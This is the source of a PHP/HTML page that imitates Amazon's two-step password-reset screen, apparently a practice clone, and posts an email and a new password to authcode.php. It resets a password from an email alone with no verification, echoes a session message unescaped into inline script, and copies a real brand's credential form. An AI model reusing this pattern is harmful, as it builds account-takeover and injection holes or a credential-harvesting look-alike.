<?php 
include("authcode.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- JavaScript -->
   <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.14.0/build/alertify.min.js"></script>

<!-- CSS -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.14.0/build/css/alertify.min.css"/>
<!-- Default theme -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.14.0/build/css/themes/default.min.css"/>
</head>
<body>
    <div class="container">
        <div class="flex justify-center items-center">
           <img src="../multi-step-form-main/assets/images/logo.png" alt="logo">
        </div>
        <div class="hidden">
          <span id="stepIndicator1" class="circledefault border mt-6 text-[12px] pt-1">1</span>
          <span id="stepIndicator2" class="circledefault border mt-6 text-[12px] pt-1">2</span>
        </div>
        <form action="authcode.php" method="POST"> 
            <div id="step1">
                <div class="card shadow-md border border-gray-300 border-light max-w-sm m-auto w-100 rounded-md h-[16rem]">
                     <div class="text-2xl font-semibold px-8 py-4">Password assistance</div>
                     <h5 class="text-sm pl-8">Enter the email address associated with your Amazon account.</span>
                     <label for="email" class="text-sm mt-5 font-semibold block">Email</h5>
                     <input type="email" name="email" required class="mt-1 w-80 mx-8 px-3 py-2 place-self-center bg-white border border-slate-300 rounded-md text-sm shadow-sm placeholder-slate-200 outline-cyan-500/50 -outline-offset-0"/>
                     <button id="nextBtn1" class="w-80 mx-8 text-1xl my-5 h-7 rounded-md" onclick="nextStep(event)" style="background-color: #FFD814;">Continue</button>
                </div>
            </div>
            

            <div id="step2" style="display: none;" class="card shadow-md border border-gray-300 border-light max-w-sm m-auto w-100 rounded-md h-[20rem]">
             <div class="text-2xl font-semibold px-8 pt-4">Create new password</div>
             <h5 class="text-sm pl-8 my-1">We'll ask for this password whenever you Sign-In.</h5>
             <label for="Password" class="text-sm font-semibold px-8 mt-2">New Password</label>
             <input type="password" name="npassword" class="mt-1 w-80 mx-8 px-3 py-2 place-self-center bg-white border border-slate-300 rounded-md text-sm shadow-sm placeholder-slate-200 outline-cyan-500/50 -outline-offset-0"/>
             <div class="flex pl-8 my-2">
               <svg xmlns="http://www.w3.org/2000/svg" width="15" height="19" viewBox="0 0 24 24"><path fill="#137070" d="M12 7q-.825 0-1.412-.587T10 5t.588-1.412T12 3t1.413.588T14 5t-.587 1.413T12 7m-1.5 14V9h3v12z"/></svg>
               <span class="text-sm">Passwords must be at least 6 characters.</span>
             </div> 
             
             <label for="Password" class="text-sm font-semibold px-8 mt-2">Re-enter password</label>
             <input type="password" name="cpassword" class="mt-1 w-80 mx-8 px-3 py-2 place-self-center bg-white border border-slate-300 rounded-md text-sm shadow-sm placeholder-slate-200 outline-cyan-500/50 -outline-offset-0"/>

             <button id="nextBtn2" name="forget_password_btn" type="submit" class="w-80 mx-8 text-1xl my-6 h-7 rounded-md" style="background-color: #FFD814;">Save changes and Sign In</button>
            
           </div>
        </form>
    </div>

    <script>
        
        let currentStep = 1;

        function showStep(step) {
            document.getElementById(`step${currentStep}`).style.display = 'none';
            document.getElementById(`step${step}`).style.display = 'block';
            currentStep = step;
            updateButtons();
        }


        function nextStep(event) {
            event.preventDefault(); // Prevent form submission
            if (currentStep < 2) {
                showStep(currentStep + 1);
            } else {
                // Form is on the final step, submit the form
                const form = document.querySelector('form');
                form.submit();
            }
        }


        function prevStep(event) {
          event.preventDefault();
          if (currentStep > 1) {
            showStep(currentStep - 1);
          }
        }

        function updateButtons() {
            for (let i = 1; i <= 2; i++) {
                document.getElementById(`prevBtn${i}`).style.display = i === 1 ? 'none' : 'inline-block';
                document.getElementById(`nextBtn${i}`).style.display = i === 2 ? 'none' : 'inline-block';
            }
        }


        showStep(1);

    </script>

    <script>
        <?php if(isset($_SESSION['message'])) { ?>
              alertify.set('notifier','position', 'top-right');
              alertify.success('<?= $_SESSION['message']; ?>');
              <?php
             unset($_SESSION['message']);
             
            }
    
        ?>

    </script>

    <script src="https://cdn.jsdelivr.net/npm/alertifyjs/build/alertify.min.js"></script>
</body>
</html>
